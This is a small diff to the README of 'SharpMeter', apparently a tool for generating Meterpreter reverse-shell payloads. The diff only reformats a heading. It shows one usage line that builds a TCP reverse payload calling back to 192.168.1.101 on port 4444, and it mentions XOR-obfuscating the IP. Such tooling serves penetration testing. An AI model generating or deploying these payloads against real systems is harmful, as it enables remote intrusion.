@@ -1,7 +1,7 @@
 # SharpMeter
 A Simple Way To Make Meterpreter Reverse Payloads
 
-Example tcp
+# Example tcp
 python SharpMeter.py 192.168.1.101 4444 compileme.cs tcp
 
 # Example Close Window / XOR IP
